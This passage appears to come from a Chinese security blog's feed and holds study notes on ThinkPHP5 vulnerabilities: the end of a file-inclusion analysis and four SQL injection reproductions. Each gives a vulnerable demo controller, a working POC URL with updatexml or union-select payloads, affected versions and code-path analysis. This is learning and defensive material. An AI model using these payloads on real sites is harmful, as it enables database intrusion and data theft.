class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;assign(request()-&gt;get());</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch(); <span class="comment">// 当前模块/默认视图目录/当前控制器（小写）/当前操作（小写）.html</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用户输入的数据被<code>get</code>方法获取，然后调用了<code>input</code>方法和递归调用<code>filterValue</code> 方法，并且该方法还会继续调用<code>filterExp</code> 方法对特殊字符进行过滤，然后返回给<code>$data</code></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185108.png" alt="image-20200916165017001"></p><p>然后再调用<code>assign</code> 方法，返回处理后的数据。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185121.png" alt="image-20200916171205436"></p><p>因此用户的数据输入，经过<code>get</code>方法和<code>assign</code>方法后，返回的内容为<code>cacheFile=favico.ico</code> ，然后程序继续调用<code>fetch</code>方法进行处理。</p><blockquote><p>fetch方法用于加载模板输出。这里如果我们没有指定模板名称，其会使用默认的文件作为模板，模板路径类似 <strong>当前模块/默认视图目录/当前控制器（小写）/当前操作（小写）.html</strong> ，如果默认路径模板不存在，程序就会报错。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185135.png" alt="image-20200916183120261"></p><p>跟进到 <strong>Template</strong> 类的 <strong>fetch</strong> 方法，可以发现可控变量 <strong>$vars</strong> 赋值给 <strong>$this-&gt;data</strong> 并最终传入 <strong>File</strong> 类的 <strong>read</strong> 方法。而 <strong>read</strong> 方法中在使用了 <strong>extract</strong> 函数后，直接包含了 <strong>$cacheFile</strong> 变量。这里就是漏洞发生的关键原因（可以通过 <strong>extract</strong> 函数，直接覆盖 <strong>$cacheFile</strong> 变量，因为 <strong>extract</strong> 函数中的参数 <strong>$vars</strong> 可以由用户控制）。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185154.png" alt="image-20200916184005912"></p><p>方法调用栈：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185205.png" alt="image-20200916184215051"></p><h2 id="利用总结"><a href="#利用总结" class="headerlink" title="利用总结"></a>利用总结</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185135.png" alt="image-20200916183120261"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185825.png" alt="7"></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185031.png" alt="image-20200916161144712"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h2 id=&quot;ThinkPHP5文件包含漏洞&quot;&gt;&lt;a href=&quot;#ThinkPHP5文件包含漏洞&quot; class=&quot;headerlink&quot; title=&quot;ThinkPHP5文件包含漏洞&quot;&gt;&lt;/a&gt;ThinkPHP5文件包含漏洞&lt;/h2&gt;&lt;h2 id=&quot;</summary>
      
    
    
    
    
    <category term="文件包含" scheme="https://hack-for.fun/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
    <category term="代码审计" scheme="https://hack-for.fun/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5漏洞学习-SQL注入</title>
    <link href="https://hack-for.fun/69fea760.html"/>
    <id>https://hack-for.fun/69fea760.html</id>
    <published>2020-09-13T05:40:27.000Z</published>
    <updated>2020-09-23T03:04:24.409Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><p>参考资料：<a href="https://github.com/Mochazz/ThinkPHP-Vuln">https://github.com/Mochazz/ThinkPHP-Vuln</a></p><p>环境准备：</p><ul><li>PHPStorm + MAMP PRO</li></ul><p>环境搭建可以看我前两篇文章。</p><ul><li>composer</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">brew install composer</span><br><span class="line">composer config -g repo.packagist composer https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;composer&#x2F;</span><br></pre></td></tr></table></figure><ul><li>获取复现代码</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink&#x2F;think&#x3D;5.0.15 tpdemo</span><br></pre></td></tr></table></figure><p>将 <strong>composer.json</strong> 文件的 <strong>require</strong> 字段设置成如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;require&quot;: &#123;</span><br><span class="line">    &quot;php&quot;: &quot;&gt;&#x3D;5.4.0&quot;,</span><br><span class="line">    &quot;topthink&#x2F;framework&quot;: &quot;5.0.15&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>SQL 注入demo 环境</li></ul><p>修改<code>/application/index/controller/index.php</code> 的代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $username = request()-&gt;get(<span class="string">&#x27;username/a&#x27;</span>);</span><br><span class="line">        db(<span class="string">&#x27;users&#x27;</span>)-&gt;insert([<span class="string">&#x27;username&#x27;</span> =&gt; $username]);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Update success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>模拟这里存在一个用户传参并与数据库交互的场景。</p></blockquote><p>可能会存在，SQL 报错</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913191229.png" alt="image-20200913135221064"></p><p>修改username 字段默认为<code>NULL</code>  即可解决问题。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913191250.png" alt="image-20200913134825568"></p><h1 id="SQL注入一-insert"><a href="#SQL注入一-insert" class="headerlink" title="SQL注入一(insert)"></a>SQL注入一(insert)</h1><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public&#x2F;index&#x2F;index?username[0]&#x3D;inc&amp;username[1]&#x3D;updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]&#x3D;1 </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913191832.png" alt="image-20200913134332556"></p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p><strong>5.0.13&lt;=ThinkPHP&lt;=5.0.15</strong> 、 <strong>5.1.0&lt;=ThinkPHP&lt;=5.1.5</strong></p><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>本次漏洞存在于 <strong>Builder</strong> 类的 <strong>parseData</strong> 方法中。由于程序没有对数据进行很好的过滤，将数据拼接进 <strong>SQL</strong> 语句，导致 <strong>SQL注入漏洞</strong> 的产生。</p><p>类型：<code>insert</code> 注入。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><blockquote><p>对于开源项目，在issue 或者 commit \ Releases 记录中，就能找到历史漏洞信息。这一点在CTF中经常用到，尤其是Node.js 的第三方依赖漏洞。</p></blockquote><p>从漏洞影响版本可以去找 已经修复后的版本，<a href="https://github.com/top-think/framework/releases/tag/v5.0.16">https://github.com/top-think/framework/releases/tag/v5.0.16</a></p><p>通过github 的<code>compare</code>功能，即可查看代码发生了哪些修改。</p><p><a href="https://github.com/top-think/framework/compare/v5.0.16...master">https://github.com/top-think/framework/compare/v5.0.16...master</a></p><p>在<code>/thinkphp/library/think/db/Connection.php</code> 的 314， 316 行下断点Debug，打payload。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913191848.png" alt="image-20200913141903209"></p><p>INSERT INTO <code>users</code> (<code>username</code>) VALUES (updatexml(1,concat(0x7,user(),0x7e),1)+1) </p><p>同时成功攻击的Payload 所在的参数位于 <code>username[1]</code> 的 <code>value</code>  。</p><p>攻击Payload 经过ThinkPHP 的内置过滤后，进入<code>$this-&gt;builder</code> 的<code>Query</code> 类的<code>insert</code> 方法，执行其中的SQL语句，并在后面返回出了执行结果。因为Payload利用<code>updatexml()</code>来报错，因此必须开启<code>app_debug</code> 来开启SQL 报错信息。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192007.png" alt="image-20200913155142684"></p><p>(如上图debug 结果中Query.php），<code>$this-&gt;builder</code> 为 <code>think\db\builder\Mysql</code> 类，<code>Query</code> 的定义位于 <code>thinkphp/library/think/db/builder/Mysql.php</code> </p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192026.png" alt="image-20200913161424839"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192043.png" alt="image-20200913161552092"></p><p>在<code>/thinkphp/library/think/db/builder/Mysql.php</code> , <code>Mysql</code> 类继承于<code>Builder</code> 类，即上面的 <strong>$this-&gt;builder-&gt;insert()</strong> 最终调用的是 <strong>Builder</strong> 类的 <strong>insert</strong> 方法</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192059.png" alt="image-20200913162209236"></p><p>方法调用<code>parseData()</code>方法来分析并处理数据，跟进该方法。</p><p><code>/thinkphp/library/think/db/Builder.php</code> </p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913193005.png" alt="image-20200913163148214"></p><p>在<code>inc</code> 和 <code>dec</code> 的 情况下，将可控数据<code>$val[1]</code>通过<code>parseKey</code>方法处理后，进行拼接，并返回<code>$result</code></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192945.png" alt="image-20200913185951795"></p><p><code>parseKey</code>方法 不做任何处理，是直接返回值的一个方法。</p><blockquote><p>因此，带有恶意SQL 语句的Payload，被拼接且没任何字符串形式处理在Builder类的insert方法中，通过str_replace函数直接替换，返回sql，带入SQL语句中被执行，造成了SQL注入漏洞。</p></blockquote><p>在<code>thinkphp/library/think/Request.php</code> 中，有调用内置过滤（直接替换为空）方法，对参数<code>exp</code>进行过滤，在case <code>exp</code>的情况下，无法造成漏洞。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192928.png" alt="carbon"></p><p>问题：为什么不能将恶意Payload 用<code>username[2]</code> 来投递？</p><p>原因：</p><p>同样的办法，下断点，debug 可以看到。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192915.png" alt="image-20200913181025221"></p><p>回到之前的<code>parseDate</code> 方法，<code>username[2]</code>的值通过<code>floatval</code>函数处理</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192902.png" alt="image-20200913171023035"></p><p>payload 变为了<code>0</code> ，且 会存在SQL 错误。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192852.png" alt="image-20200913182241348"></p><h2 id="利用总结"><a href="#利用总结" class="headerlink" title="利用总结"></a>利用总结</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192749.png" alt="image-20200913185834897"></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192803.png" alt="image-20200913151252661"></p><h1 id="SQL注入二-update"><a href="#SQL注入二-update" class="headerlink" title="SQL注入二(update)"></a>SQL注入二(update)</h1><p>复现代码获取：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink&#x2F;think&#x3D;5.1  tpdemo3</span><br></pre></td></tr></table></figure><p>将 <strong>composer.json</strong> 文件的 <strong>require</strong> 字段设置成如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;require&quot;: &#123;</span><br><span class="line">    &quot;php&quot;: &quot;&gt;&#x3D;5.6.0&quot;,</span><br><span class="line">    &quot;topthink&#x2F;framework&quot;: &quot;5.1.7&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>../config/app.php</code> 中，需要修改<code>app_trace</code> 为true， <code>app_debug</code> 默认开启了。</p><p>创建数据库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">create database tpdemo;</span><br><span class="line">use tpdemo;</span><br><span class="line">create table users(</span><br><span class="line">id int primary key auto_increment,</span><br><span class="line">username varchar(50) not null</span><br><span class="line">);</span><br><span class="line">insert into users(id,username) values(1,&#39;testuser&#39;);</span><br></pre></td></tr></table></figure><p>这里也要设置username 字段 为<code>NULL</code> 才行</p><p>修改<code>/application/index/controller/index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $username = request()-&gt;get(<span class="string">&#x27;username/a&#x27;</span>);</span><br><span class="line">        db(<span class="string">&#x27;users&#x27;</span>)-&gt;where([<span class="string">&#x27;id&#x27;</span> =&gt; <span class="number">1</span>])-&gt;update([<span class="string">&#x27;username&#x27;</span> =&gt; $username]);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Update success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;public&#x2F;index&#x2F;index?username[0]&#x3D;point&amp;username[1]&#x3D;1&amp;username[2]&#x3D;updatexml(1,concat(0x7,user(),0x7e),1)^&amp;username[3]&#x3D;0</span><br></pre></td></tr></table></figure><p>很SQL 注入一非常类似。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914203133.png" alt="image-20200914152750668"></p><h2 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h2><p>漏洞影响版本： <strong>5.1.6&lt;=ThinkPHP&lt;=5.1.7</strong> (非最新的 <strong>5.1.8</strong> 版本也可利用)。</p><h2 id="漏洞概述-1"><a href="#漏洞概述-1" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>本次漏洞存在于 <strong>Mysql</strong> 类的 <strong>parseArrayData</strong> 方法中由于程序没有对数据进行很好的过滤，将数据拼接进 <strong>SQL</strong> 语句，导致 <strong>SQL注入漏洞</strong> 的产生</p><p>注入类型：<code>update</code> 注入</p><h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><blockquote><p>对于开源项目，在issue 或者 commit \ Releases 记录中，就能找到历史漏洞信息。这一点在CTF中经常用到，尤其是Node.js 的第三方依赖漏洞。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914203118.png" alt="image-20200914161022479"></p><ul><li>下断点，debug。观察参数传递过程</li><li>监控MySQL</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914203111.png" alt="image-20200914184917592"></p><hr><p>下断点，开启Debug，打Payload。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914202218.png" alt="image-20200914173011583"></p><p><code>../thinkphp/library/think/db/Query.php</code> 中，Payload 传入Query 类的 <code>update</code>方法，跟进该方法，该方法调用了<code>Connection</code> 类的该方法为<code>update</code>方法，该方法又调用了 </p><p><code>$this-&gt;builder</code> 的<code>update</code> 方法，此处的<code>$this-&gt;builder</code> 为为<code>think\db\builder\Mysql</code> 类。<code>class Mysql extends Builder</code> ，该类继承于<code>Builder</code> 类。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914202201.png" alt="image-20200914170732409"></p><p>在<code>Builder</code>类中的<code>update</code>方法，调用了<code>parseData</code>方法，（正如上图debug结果。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914202036.png" alt="image-20200914184754350"></p><p>在该方法中的<code>swich</code>语句中，之前出现过漏洞，现在多了一条default 语句。而在新版本中被删除了。</p><p>跟进到<code>parseData</code> 方法，发现Payload 又被<code>parseArrayData</code>方法处理，继续跟进，</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914202026.png" alt="image-20200914185836504"></p><p>在<code>../thinkphp/library/think/db/builder/Mysql.php</code> 中的 200 行返回result 的地方打断点，调试结果如下。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914202011.png"></p><p>此处将可控变量经过拼接后被带入数据库进行查询。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914201959.png" alt="image-20200914193548748"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseArrayData</span>(<span class="params">Query $query, $data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">list</span>($type, $value) = $data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (strtolower($type)) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;point&#x27;</span>:</span><br><span class="line">            $fun   = <span class="keyword">isset</span>($data[<span class="number">2</span>]) ? $data[<span class="number">2</span>] : <span class="string">&#x27;GeomFromText&#x27;</span>;</span><br><span class="line">            $point = <span class="keyword">isset</span>($data[<span class="number">3</span>]) ? $data[<span class="number">3</span>] : <span class="string">&#x27;POINT&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span> (is_array($value)) &#123;</span><br><span class="line">                $value = implode(<span class="string">&#x27; &#x27;</span>, $value);</span><br><span class="line">            &#125;</span><br><span class="line">            $result = $fun . <span class="string">&#x27;(\&#x27;&#x27;</span> . $point . <span class="string">&#x27;(&#x27;</span> . $value . <span class="string">&#x27;)\&#x27;)&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            $result = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$result = $fun . <span class="string">&#x27;(\&#x27;&#x27;</span> . $point . <span class="string">&#x27;(&#x27;</span> . $value . <span class="string">&#x27;)\&#x27;)&#x27;</span>;</span><br></pre></td></tr></table></figure><p>三个变量均可控。形式为：<code>$a(&#39;$b($c)&#39;)</code> </p><blockquote><p>现在就是想办法如何闭合，然后进行注入攻击。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE &#96;users&#96;  SET &#96;username&#96; &#x3D; $a(&#39;$b($c)&#39;)  WHERE  &#96;id&#96; &#x3D; 1;</span><br></pre></td></tr></table></figure><p>即让<code>$fun</code> 为我们的恶意Payload 即可。然后闭合掉后面的部分。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,concat(0x7,user(),0x7e),1)^(&#39;0(1)&#39;)</span><br></pre></td></tr></table></figure><h2 id="利用总结-1"><a href="#利用总结-1" class="headerlink" title="利用总结"></a>利用总结</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914201929.png" alt="carbon"></p><p>下图来自参考资料。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914201900.png" alt="8"></p><h2 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>升级最新版，</p><p>官方直接删了<code>parseArrayDate</code> 函数。</p><blockquote><p>一点点感想，我感觉按照这个师傅的分析思路，是逆着payload 去分析的漏洞原因，我好想正面直接挖啊，菜死了。</p></blockquote><h1 id="SQL注入三-select"><a href="#SQL注入三-select" class="headerlink" title="SQL注入三(select)"></a>SQL注入三(select)</h1><p>新增参考资料：<a href="https://www.cnblogs.com/wangtanzhi/p/12732557.html">https://www.cnblogs.com/wangtanzhi/p/12732557.html</a></p><blockquote><p>学习就是要学习不同大佬的思路，然后转换为自己的思路。</p></blockquote><h2 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;public&#x2F;index.php&#x2F;index&#x2F;index&#x2F;?username&#x3D;)%20union%20select%20updatexml(1,concat(0x7,user(),0x7e),1)%23</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105138.png" alt="image-20200914214213065"></p><p>sqlmap 也可以跑出结果。</p><h2 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h2><p>ThinkPHP5 全版本</p><h2 id="漏洞概述-2"><a href="#漏洞概述-2" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>本次漏洞存在于 <strong>Mysql</strong> 类的 <strong>parseWhereItem</strong> 方法中。由于程序没有对数据进行很好的过滤，将数据拼接进 <strong>SQL</strong> 语句，导致 <strong>SQL注入漏洞</strong> 的产生。</p><h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><ul><li>MySQL 监控</li></ul><blockquote><p>监控不到，不知道为什么。配置也是正确的。</p></blockquote><p><code>/application/index/controller/index.php</code></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105308.png" alt="image-20200914220015121"></p><blockquote><p>然后用户输入的数据会原样进入框架的 SQL 查询方法中。首先程序先调用 Query 类的 where 方法，通过其 parseWhereExp 方法分析查询表达式，然后再返回并继续调用 select 方法准备开始构建 select 语句。（这个点得记住，框架的sql查询方法先进入 Query 类）</p></blockquote><hr><blockquote><p>程序默认调用 <strong>Request</strong> 类的 <strong>get</strong> 方法中会调用该类的 <strong>input</strong> 方法，但是该方法默认情况下并没有对数据进行很好的过滤，所以用户输入的数据会原样进入框架的 <strong>SQL</strong> 查询方法中。首先程序先调用 <strong>Query</strong> 类的 <strong>where</strong> 方法，通过其 <strong>parseWhereExp</strong> 方法分析查询表达式，然后再返回并继续调用 <strong>select</strong> 方法准备开始构建 <strong>select</strong> 语句。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105416.png" alt="image-20200914222945520"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105701.png" alt="image-20200914224146213"></p><p>此处调用<code>$this-&gt;builder</code>的<code>select</code>方法。而此处<code>$this-&gt;builder</code> 为<code>think/db/builder/Mysql</code> 类，继承于<code>Builder</code> 类。因此调用的是<code>Builder</code>类的<code>select</code> 方法</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105718.png" alt="image-20200914225616763"></p><p>在 <strong>select</strong> 方法中，程序会对 <strong>SQL</strong> 语句模板用变量填充，其中用来填充 <strong>%WHERE%</strong> 的变量中存在用户输入的数据。跟进这个 <strong>where</strong> 分析函数，会发现其会调用生成查询条件 <strong>SQL</strong> 语句的 <strong>buildWhere</strong> 函数。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105734.png" alt="image-20200914231827114"></p><p>此处<code>$where</code> 经过 <code>buildWhere</code> 方法处理后返回<code>$whereStr</code></p><p><code>parseWhereItem</code> 的 <code>where</code>  子单元函数方法调用，当操作符为<code>EXP</code> 时，经过拼接带入SQL查询，造成SQL注入。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105750.png" alt="image-20200914235436560"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105805.png" alt="image-20200915000616883"></p><p>完整的方法调用如上图绿色部分。</p><h2 id="利用总结-2"><a href="#利用总结-2" class="headerlink" title="利用总结"></a>利用总结</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105825.png" alt="carbon (1)"></p><h2 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>官网未修复。</p><blockquote><p>继承类，等面向对象的基本知识很重要。</p></blockquote><h1 id="SQL注入四-select"><a href="#SQL注入四-select" class="headerlink" title="SQL注入四(select)"></a>SQL注入四(select)</h1><p>漏洞复现环境和上面应该是差不多的。</p><h2 id="POC-3"><a href="#POC-3" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public&#x2F;index.php&#x2F;index&#x2F;index?username[0]&#x3D;not%20like&amp;username[1][0]&#x3D;%%&amp;username[1][1]&#x3D;233&amp;username[2]&#x3D;)%20union%20select%201,user()%23</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915125740.png" alt="image-20200915122649716"></p><h2 id="影响版本-3"><a href="#影响版本-3" class="headerlink" title="影响版本"></a>影响版本</h2><p><strong>ThinkPHP: 5.0.10</strong></p><h2 id="漏洞概述-3"><a href="#漏洞概述-3" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><blockquote><p>本次漏洞存在于 <strong>Mysql</strong> 类的 <strong>parseWhereItem</strong> 方法中。由于程序没有对数据进行很好的过滤，直接将数据拼接进 <strong>SQL</strong> 语句。再一个， <strong>Request</strong> 类的 <strong>filterValue</strong> 方法漏过滤 <strong>NOT LIKE</strong> 关键字，最终导致 <strong>SQL注入漏洞</strong> 的产生</p></blockquote><p>在MySQL 中 <code>NOT LIKE</code>  为模糊查询，什么是模糊查询呢？</p><blockquote><p>mysql模糊查询like的用法:</p><p>查询user表中姓名中有“王”字的：</p><p>select * from user where name like ‘%王%’</p><p>mysql模糊查询not like的用法</p><p>查询user表中姓名中没有“王”字的：</p><p>select * from user where name not like 